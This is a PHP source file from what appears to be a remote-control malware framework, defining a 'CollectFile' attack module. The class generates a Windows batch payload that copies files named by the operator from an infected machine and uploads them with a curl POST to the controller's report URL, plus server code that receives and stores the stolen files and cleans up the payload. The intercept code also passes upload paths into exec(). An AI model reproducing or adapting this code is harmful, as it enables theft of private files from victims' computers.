<?php /** @noinspection PhpUnused */

/** @noinspection PhpUnusedParameterInspection */

namespace Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;
use function Kelvinho\Virus\filter;
use function Kelvinho\Virus\map;

class CollectFile extends AttackInterface {
    private array $fileNames = [];

    public function __construct() {
    }

    public function getFileNames(): array {
        return $this->fileNames;
    }

    public function getEmptyFiles(): array {
        return filter($this->fileNames, function ($element, $index) {
            $file = DATA_FILE . "/attacks/$this->attack_id/file$index";
            if (!file_exists($file)) {
                return true;
            }
            return filesize($file) === 0;
        }, null, false);
    }

    public function getNonEmptyFiles(): array {
        return filter($this->fileNames, function ($element, $index) {
            $file = DATA_FILE . "/attacks/$this->attack_id/file$index";
            if (file_exists($file)) {
                return filesize(DATA_FILE . "/attacks/$this->attack_id/file$index") !== 0;
            } else {
                return false;
            }
        }, null, false);
    }

    public function setFileNames(string $fileNames): void {
        $this->fileNames = filter(map(explode("\n", $fileNames), function ($element) {
            return trim($element);
        }), function ($element) {
            return !empty($element);
        });
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        use Kelvinho\Virus\Attack\AttackInterface;
        for ($i = 0; $i < <?php echo count($this->fileNames); ?>; $i++) {
            if (!isset($_FILES["file$i"])) {logError("Supposed to have file $i");}
        }
        for ($i = 0; $i < <?php echo count($this->fileNames); ?>; $i++) {
            exec("mv \"" . $_FILES["file$i"]["tmp_name"] . "\" \"" . DATA_FILE . "/attacks/<?php echo $this->attack_id; ?>/file$i\"");
        }
        $attack = AttackInterface::get("<?php echo $this->attack_id; ?>");
        $attack->setExecuted();
        $attack->saveState();
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->fileNames = $state["fileNames"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["fileNames"] = $this->fileNames;
        return json_encode($state);
    }

    //@formatter:off
    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -X POST <?php
        for ($i = 0; $i < count($this->fileNames); $i++) {
            echo "--form \"file$i=@%~pd0file$i\" ";
        }
        echo DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        chCp 65001
        <?php
        for ($i = 0; $i < count($this->fileNames); $i++) { ?>
            if exist "<?php echo $this->fileNames[$i]; ?>" (
                copy "<?php echo $this->fileNames[$i]; ?>" "%~pd0file<?php echo $i; ?>"
            ) else (
                copy nul "%~pd0file<?php echo $i; ?>"
            )
            <?php
        }
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will include the correct admin page for this particular attack type.
     */
    public function includeAdminPage(): void {
        include(__DIR__ . "/admin.php");
    }

    /**
     * This will include the correct controller page for this particular attack type.
     */
    public function includeController(): void {
        include(__DIR__ . "/controller.php");
    }
}
